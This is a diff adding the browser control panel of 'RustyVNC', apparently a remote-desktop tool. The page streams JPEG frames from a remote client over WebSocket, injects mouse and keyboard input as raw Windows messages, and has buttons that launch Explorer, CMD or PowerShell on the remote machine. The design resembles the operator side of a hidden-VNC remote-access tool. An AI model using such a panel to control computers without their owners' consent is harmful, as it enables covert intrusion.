@@ -1,0 +1,159 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>RustyVNC</title>
+  <style>
+    :root { color-scheme: dark; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    body { margin: 0; background: #191b1f; color: #d9d4c7; }
+    header { height: 52px; display: flex; align-items: center; gap: 12px; padding: 0 18px; border-bottom: 1px solid #30343a; background: #202329; }
+    button, select, input { background: #242830; color: #d9d4c7; border: 1px solid #565d68; border-radius: 4px; padding: 7px 10px; font: inherit; }
+    button { cursor: pointer; }
+    button.primary { border-color: #b6c20f; color: #d4df2a; }
+    button.danger { border-color: #dd665c; color: #ff7f75; }
+    main { display: grid; grid-template-rows: auto 1fr; height: calc(100vh - 53px); }
+    .bar { display: flex; align-items: center; gap: 10px; padding: 12px 18px; border-bottom: 1px solid #30343a; }
+    .status { margin-left: auto; color: #9fa6b2; font-size: 12px; }
+    .stage { display: flex; align-items: center; justify-content: center; overflow: hidden; background: #111317; }
+    canvas { max-width: 100%; max-height: 100%; outline: none; cursor: crosshair; background: #000; }
+    .pill { border: 1px solid #565d68; border-radius: 999px; padding: 4px 9px; font-size: 12px; }
+    .ok { color: #b6c20f; border-color: #b6c20f; }
+  </style>
+</head>
+<body>
+  <header>
+    <strong>RustyVNC</strong>
+    <span id="client" class="pill">no client</span>
+    <span id="active" class="pill">inactive</span>
+  </header>
+  <main>
+    <section class="bar">
+      <button id="start" class="primary">Start</button>
+      <button id="stop" class="danger">Stop</button>
+      <button data-launch="explorer">Explorer</button>
+      <button data-launch="cmd">CMD</button>
+      <button data-launch="powershell">PowerShell</button>
+      <label>Quality <input id="quality" type="range" min="10" max="95" step="5" value="70"></label>
+      <span id="qualityText">70</span>
+      <span id="status" class="status">connecting...</span>
+    </section>
+    <section class="stage">
+      <canvas id="view" tabindex="0"></canvas>
+    </section>
+  </main>
+  <script>
+    const canvas = document.getElementById('view');
+    const ctx = canvas.getContext('2d');
+    const statusEl = document.getElementById('status');
+    const clientEl = document.getElementById('client');
+    const activeEl = document.getElementById('active');
+    const quality = document.getElementById('quality');
+    const qualityText = document.getElementById('qualityText');
+    let ws;
+    let remoteW = 0;
+    let remoteH = 0;
+
+    const vk = {
+      Backspace: 0x08, Tab: 0x09, Enter: 0x0D, Escape: 0x1B, ' ': 0x20,
+      End: 0x23, Home: 0x24, ArrowLeft: 0x25, ArrowUp: 0x26, ArrowRight: 0x27, ArrowDown: 0x28,
+      Insert: 0x2D, Delete: 0x2E, PageUp: 0x21, PageDown: 0x22,
+      Shift: 0x10, Control: 0x11, Alt: 0x12
+    };
+
+    function connect() {
+      const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+      ws = new WebSocket(`${proto}//${location.host}/ws/viewer${location.search}`);
+      ws.binaryType = 'arraybuffer';
+      ws.onopen = () => send({ type: 'status' });
+      ws.onclose = () => {
+        statusEl.textContent = 'disconnected; retrying...';
+        setTimeout(connect, 1000);
+      };
+      ws.onmessage = event => {
+        if (event.data instanceof ArrayBuffer) drawFrame(event.data);
+        else updateStatus(JSON.parse(event.data));
+      };
+    }
+
+    function send(obj) {
+      if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(obj));
+    }
+
+    function updateStatus(s) {
+      clientEl.textContent = s.connected ? shortId(s.client_id) : 'no client';
+      clientEl.className = s.connected ? 'pill ok' : 'pill';
+      activeEl.textContent = s.active ? 'active' : 'inactive';
+      activeEl.className = s.active ? 'pill ok' : 'pill';
+      const dims = s.width && s.height ? ` ${s.width}x${s.height}` : '';
+      statusEl.textContent = `${s.message || 'ready'}${dims} frame=${s.frame_seq || 0}`;
+    }
+
+    function drawFrame(buf) {
+      if (buf.byteLength < 24) return;
+      const view = new DataView(buf);
+      remoteW = view.getUint32(16, true);
+      remoteH = view.getUint32(20, true);
+      const jpeg = buf.slice(24);
+      createImageBitmap(new Blob([jpeg], { type: 'image/jpeg' })).then(bitmap => {
+        canvas.width = bitmap.width;
+        canvas.height = bitmap.height;
+        ctx.drawImage(bitmap, 0, 0);
+        bitmap.close();
+      });
+    }
+
+    function shortId(id) {
+      return id ? id.slice(0, 8) : 'no client';
+    }
+
+    function coords(event) {
+      const rect = canvas.getBoundingClientRect();
+      const x = Math.max(0, Math.min(remoteW || canvas.width, Math.round((event.clientX - rect.left) * (remoteW || canvas.width) / rect.width)));
+      const y = Math.max(0, Math.min(remoteH || canvas.height, Math.round((event.clientY - rect.top) * (remoteH || canvas.height) / rect.height)));
+      return (y << 16) | (x & 0xffff);
+    }
+
+    function input(msg, wparam, lparam) {
+      send({ type: 'input', msg, wparam, lparam });
+    }
+
+    document.getElementById('start').onclick = () => send({ type: 'start', quality: Number(quality.value) });
+    document.getElementById('stop').onclick = () => send({ type: 'stop' });
+    quality.oninput = () => qualityText.textContent = quality.value;
+    document.querySelectorAll('[data-launch]').forEach(btn => {
+      btn.onclick = () => send({ type: 'launch', action: btn.dataset.launch });
+    });
+
+    canvas.addEventListener('mousemove', e => input(0x0200, 0, coords(e)));
+    canvas.addEventListener('mousedown', e => {
+      canvas.focus();
+      input(e.button === 2 ? 0x0204 : e.button === 1 ? 0x0207 : 0x0201, 1, coords(e));
+      e.preventDefault();
+    });
+    canvas.addEventListener('mouseup', e => {
+      input(e.button === 2 ? 0x0205 : e.button === 1 ? 0x0208 : 0x0202, 0, coords(e));
+      e.preventDefault();
+    });
+    canvas.addEventListener('contextmenu', e => e.preventDefault());
+    canvas.addEventListener('wheel', e => {
+      const delta = e.deltaY < 0 ? 120 : -120;
+      input(0x020A, (delta & 0xffff) << 16, coords(e));
+      e.preventDefault();
+    });
+    canvas.addEventListener('keydown', e => {
+      const code = vk[e.key] || (e.key.length === 1 ? e.key.toUpperCase().charCodeAt(0) : 0);
+      if (code) input(0x0100, code, 1);
+      if (e.key.length === 1) input(0x0102, e.key.charCodeAt(0), 1);
+      e.preventDefault();
+    });
+    canvas.addEventListener('keyup', e => {
+      const code = vk[e.key] || (e.key.length === 1 ? e.key.toUpperCase().charCodeAt(0) : 0);
+      if (code) input(0x0101, code, (1 << 31) | (1 << 30) | 1);
+      e.preventDefault();
+    });
+
+    connect();
+  </script>
+</body>
+</html>
